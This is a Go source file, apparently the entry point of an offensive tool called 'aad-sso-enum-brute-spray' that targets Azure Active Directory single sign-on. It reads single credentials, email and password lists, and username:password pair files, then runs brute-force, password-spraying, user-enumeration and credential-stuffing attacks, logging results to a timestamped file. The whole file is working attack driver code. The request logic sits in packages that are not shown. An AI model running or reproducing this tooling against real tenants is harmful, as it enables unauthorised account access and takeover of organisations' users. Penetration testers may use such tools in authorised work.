package main

import (
	"aad-sso-enum-brute-spray/pkg/clients"
	"aad-sso-enum-brute-spray/pkg/services"
	"bufio"
	"flag"
	"io"
	"log"
	"os"
	"strings"
	"sync"
	"time"
)

type Flag struct {
	set   bool
	value string
}

func (sf *Flag) Set(x string) error {
	sf.value = x
	sf.set = true
	return nil
}

func (sf *Flag) String() string {
	return sf.value
}

var (
	email         Flag
	password      Flag
	emailsFile    Flag
	passwordsFile Flag
	paired        Flag
	wg            sync.WaitGroup
)

func init() {
	flag.Var(&email, "email", "Example: user@domain.com")
	flag.Var(&password, "password", "Example: P@ssw0rd!")
	flag.Var(&emailsFile, "emails-file", "Example: /your/path/emails.txt")
	flag.Var(&passwordsFile, "passwords-file", "Example: /your/path/passwords.txt")
	flag.Var(&paired, "paired", "File containing list of credentials in username:password format")
}

func main() {
	flag.Parse()
	filename := "output-" + time.Now().Format("20060102150405") + ".txt"
	fd, err := os.Create(filename)
	if err != nil {
		log.Print(err)
		os.Exit(1)
	}
	output := io.MultiWriter(os.Stdout, fd)

	if email.set && password.set {
		wg.Add(1)
		domain := strings.Split(email.value, "@")[1]
		client := clients.NewAzureClient()
		go client.GetAzureActiveDirectory(domain, email.value, password.value, &wg, output)
	}
	if emailsFile.set {
		if _, err := os.Stat(emailsFile.value); os.IsNotExist(err) {
			println("[!] The file doesn't exist")
			os.Exit(1)
		}
	}
	if passwordsFile.set {
		if _, err := os.Stat(passwordsFile.value); os.IsNotExist(err) {
			println("[!] The file doesn't exist")
			os.Exit(1)
		}
	}
	if passwordsFile.set && emailsFile.set {
		bruteForcing(emailsFile.value, passwordsFile.value, output)
	}
	if paired.set {
		if _, err := os.Stat(paired.value); os.IsNotExist(err) {
			println("[!] The file doesn't exist")
			os.Exit(1)
		} else {
			pairedAttack(paired.value, output)
		}
	}
	if email.set && passwordsFile.set {
		domain := strings.Split(email.value, "@")[1]
		client := clients.NewAzureClient()
		passwordAttack := services.NewPasswordAttack(passwordsFile.value, email.value, domain, client, &wg, output)
		passwordAttack.Execute()
	}
	if emailsFile.set && password.set {
		client := clients.NewAzureClient()
		enumUsers := services.NewEnumUsers(emailsFile.value, password.value, client, &wg, output)
		enumUsers.Execute()
	}
	wg.Wait()
}

func bruteForcing(usersFile string, passwordsFile string, writer io.Writer) {
	users, err := os.Open(usersFile)
	if err != nil {
		log.Fatal(err)
	}
	defer users.Close()
	scannerUsers := bufio.NewScanner(users)
	for scannerUsers.Scan() {
		user := scannerUsers.Text()
		domain := strings.Split(user, "@")[1]
		client := clients.NewAzureClient()
		passwordAttack := services.NewPasswordAttack(passwordsFile, user, domain, client, &wg, writer)
		passwordAttack.Execute()
	}
	if err := scannerUsers.Err(); err != nil {
		log.Fatal(err)
	}
}
func pairedAttack(pairedFile string, writer io.Writer) {
	pairs, err := os.Open(pairedFile)
	if err != nil {
		log.Fatal(err)
	}
	defer pairs.Close()
	scannerPairs := bufio.NewScanner(pairs)
	for scannerPairs.Scan() {
		wg.Add(1)
		pair := strings.Split(scannerPairs.Text(), ":")
		if len(pair) == 1 {
			println("[!] Delimiter \":\" not found")
			os.Exit(1)
		}
		mail := pair[0]
		password := pair[1]
		domain := strings.Split(mail, "@")[1]
		client := clients.NewAzureClient()
		go client.GetAzureActiveDirectory(domain, mail, password, &wg, writer)
	}
	if err := scannerPairs.Err(); err != nil {
		log.Fatal(err)
	}
}
